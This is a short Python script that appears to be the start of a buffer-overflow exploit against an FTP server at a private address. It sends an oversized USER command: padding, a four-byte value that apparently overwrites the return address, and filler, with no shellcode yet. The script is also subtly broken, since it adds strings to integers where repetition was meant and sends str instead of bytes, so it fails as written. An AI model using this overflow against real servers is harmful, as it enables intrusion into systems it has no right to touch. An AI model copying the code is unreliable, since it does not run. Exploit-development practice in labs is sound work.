#!/usr/bin/python3

import socket

buf = "A" + 485 + "\x3b\x31\x9d\x7c" + "C" + (1100 - 489)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(("192.168.0.108", 21))
r = s.recv(1024)
print(r)

s.send("USER "+buf+"\r\n")
r = s.recv(1024)
print(r)

